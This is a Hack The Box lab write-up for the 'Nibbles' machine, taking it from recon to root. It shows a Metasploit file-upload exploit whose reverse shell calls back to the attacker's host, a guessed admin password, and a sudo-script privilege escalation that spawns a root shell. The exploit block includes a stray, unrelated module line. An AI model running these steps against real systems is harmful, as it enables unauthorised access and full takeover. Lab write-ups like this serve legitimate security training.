# HTB — Nibbles

**Difficulty:** Easy
**OS:** Linux (Ubuntu)
**Target Service:** Nibbleblog v4.0.3
**CVE:** CVE-2015-6967 (Arbitrary File Upload)

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Two open ports discovered:

| Port | Service |
|------|---------|
| 22 | OpenSSH 7.2p2 (Ubuntu) |
| 80 | Apache httpd 2.4.18 (Ubuntu) |

Pulled HTTP headers and page source:

```bash
curl -I http://10.xx.xx.xx && curl -L http://10.xx.xx.xx
```

The index page returned minimal content but contained a developer comment in the HTML source:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

This revealed a hidden subdirectory without any scanning tools — a reminder to always read page source manually.

Confirmed the `/nibbleblog/` path returns a live PHP application (`PHPSESSID` cookie present in headers). Checked `robots.txt` — not present.

Ran `searchsploit` against the application name:

```bash
searchsploit nibbleblog
```

Returned a critical finding: **Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)**. Version confirmation needed before proceeding.

---

## Phase Enumeration

Ran directory enumeration against the `/nibbleblog/` path:

```bash
gobuster dir -u http://10.xx.xx.xx/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Key findings:

| Path | Status | Notes |
|------|--------|-------|
| `/admin.php` | 200 | Live admin login page |
| `/README` | 200 | Version disclosure |
| `/content/` | 301 | Writable content directory |
| `/plugins/` | 301 | Plugin directory |

Confirmed version via README:

```bash
curl http://10.xx.xx.xx/nibbleblog/README
# Version: v4.0.3 — Codename: Coffee
```

Version matched the searchsploit result exactly.

Checked exposed XML configuration files for credential disclosure:

```bash
curl http://10.xx.xx.xx/nibbleblog/content/private/config.xml
curl http://10.xx.xx.xx/nibbleblog/content/private/users.xml
```

`config.xml` revealed the admin email (`admin@nibbles.com`), confirming the username as `admin`. No password stored in either file.

`users.xml` also revealed an IP blacklist mechanism — Nibbleblog locks out IPs after failed login attempts, making brute force unreliable on this box.

Credentials obtained via context-based inference — the box is named "Nibbles", the application is "Nibbleblog". Tested `admin/nibbles` against `/nibbleblog/admin.php`. Login successful.

---

## Phase Exploit

With valid credentials and confirmed version, loaded the Metasploit module:

```
use exploit/multi/http/tomcat_mgr_upload
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS <target IP>
set TARGETURI /nibbleblog/
set USERNAME admin
set PASSWORD nibbles
set LHOST <VPN interface>
set LPORT 4444
run
```

The module requires the **My Image** plugin to be installed and active — confirmed via the admin panel before firing. The exploit uploads a malicious PHP file through the plugin's image upload functionality and catches a Meterpreter shell.

Dropped to a shell and upgraded to full TTY:

```bash
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Initial access confirmed as `nibbler` — a low-privilege user.

Retrieved the user flag from `/home/nibbler/user.txt`. Flag redacted.

---

## Phase Privilege Escalation

First post-exploitation check — sudo permissions:

```bash
sudo -l
```

Output:

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can execute a specific shell script as root with no password. The script path did not exist, meaning it could be created with arbitrary content.

Created the directory structure and wrote a root shell payload:

```bash
mkdir -p /home/nibbler/personal/stuff
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Shell spawned as root immediately.

```bash
whoami
# root
```

Retrieved root flag from `/root/root.txt`. Flag redacted.

---

## Key Takeaways

- HTML comments in page source can expose directory paths without any scanning — always read raw source manually before reaching for tools
- Exposed XML files (`config.xml`, `users.xml`) in Nibbleblog revealed the username and confirmed a blacklist mechanism that would have defeated brute force
- Box naming conventions in HTB often hint directly at credentials — `Nibbles` → `nibbleblog` → password `nibbles`
- `sudo -l` is always the first privesc check on Linux; a NOPASSWD entry on a non-existent script is an immediate root path
- The `mkdir -p` flag creates full directory trees in one command — essential when a required path doesn't exist yet
